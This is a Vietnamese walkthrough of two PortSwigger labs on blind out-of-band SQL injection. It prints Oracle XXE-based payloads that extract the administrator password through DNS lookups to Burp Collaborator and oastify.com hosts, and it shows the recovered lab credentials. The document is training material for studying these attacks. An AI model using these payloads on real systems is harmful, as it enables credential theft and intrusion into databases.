# out-of-band SQL injection

## 1. Lab: Blind SQL injection with out-of-band data exfiltration

link: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

### Đề bài

![image](https://hackmd.io/_uploads/SyZahvj3p.png)

### Phân tích

- Trang web chứa lỗ hổng SQL injection dạng Blind khi phân tích và thực hiện truy vấn SQL bằng cookie theo dõi (tracking cookie), trong câu truy vấn có chứa giá trị của cookie đã gửi. Câu truy vấn được thực thi không đồng bộ nên chỉ có thể khai thác bằng kỹ thuật Out-of-band. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm tìm kiếm mật khẩu tài khoản administrator, biết rằng trong cơ sở dữ liệu chứa bảng users, gồm cột username và password.
- chúng ta xác định được trang web sử dụng hệ cơ sở dữ liệu Oracle, payload:

```sql!
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

![image](https://hackmd.io/_uploads/BJgHydo36.png)

mình dùng burp suit pro scan với lỗ hổng XXE và sql injection

![image](https://hackmd.io/_uploads/H1fSJOoh6.png)

kết quả cho thấy có lỗ hổng sql injection

![image](https://hackmd.io/_uploads/BJx3yujnp.png)

burp suit pro quét được lỗ hổng với payload

```sql!
 '||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % zyfiz SYSTEM "http://p7xlm245cgbjhfif8s93g5f6wx2qqgek2dp3ds.oasti'||'fy.com/">%zyfiz;]>'),'/l') from dual)||
```

![image](https://hackmd.io/_uploads/r1BMmuonT.png)

![image](https://hackmd.io/_uploads/ryl4xdj2p.png)

thông báo từ burp suit cho thấy lab dùng CSDL Oracle và dùng sub-query của hàm xmltype trong Oracle để đánh giá dữ liệu xml

- và chúng ta thấy payload đã tạo 1 ENTITY trong DTD để thực hiện lỗ hổng XXE chèn vào data xml 1 url để hệ thống đọc
- vậy là chúng ta có thể chèn bất cứ url nào vào hệ thống và có thể đó là url đến server chứa mã thực thi của chúng ta để RCE

### Khai thác

gửi payload trên đến url của burp collaborator

![image](https://hackmd.io/_uploads/HJc7N_j36.png)

và mình nhận được gói tin đến

![image](https://hackmd.io/_uploads/S1O-VOi26.png)

- Thực hiện DNS lookup thành công, có thể chắc chắn cookie TrackingId chứa lỗ hổng Blind SQL injection có thể tấn công bằng kỹ thuật Out-of-band.

- Để truy xuất mật khẩu người dùng administrator trong bảng users, chúng ta có câu truy vấn `SELECR password FROM users WHERE username = 'administrator'`, kết hợp với kỹ thuật Out-of-band chúng ta sẽ dùng payload sau để trích xuất được password của admin

```sql!
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

![image](https://hackmd.io/_uploads/H1U3Hdj2a.png)

và mình được password của admin là **tzrq2xikakazdmpxbpv0**

đăng nhập tài khoản **administrator:tzrq2xikakazdmpxbpv0** và mình solve được lab này

![image](https://hackmd.io/_uploads/rJPgLuj26.png)

## 2. Lab: Blind SQL injection with out-of-band interaction

link: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

### Đề bài

![image](https://hackmd.io/_uploads/BJ5yv_s3a.png)

### Phân tích

- Bài lab tiếp tục khai thác lỗ hổng SQLi tại trường TrackingID tại Cookie, ứng dụng web trong bài này sẽ sử dụng dạng Out-of-band SQLi để tương tác với external domain (domain mà ta control).

### Khai thác

- tương tự bài trên mình dùng burp scan và trigger thành công với payload

```sql!
'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % mcckv SYSTEM "http://cs887ppsx3w62232tfuq1s0thkndb4z8n1aryg.oasti'||'fy.com/">%mcckv;]>'),'/l') from dual)||'
```

Trong đó, payload trên tận dụng lỗ hổng XXE để tạo 1 parameter entity `mcckv` chứa giá trị được lấy từ external domain của attacker thông qua keyword SYSTEM.

![image](https://hackmd.io/_uploads/rJGHFuohp.png)

đồng thời bài lab của chúng ta đã được solve

![image](https://hackmd.io/_uploads/r1nJYdjna.png)

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
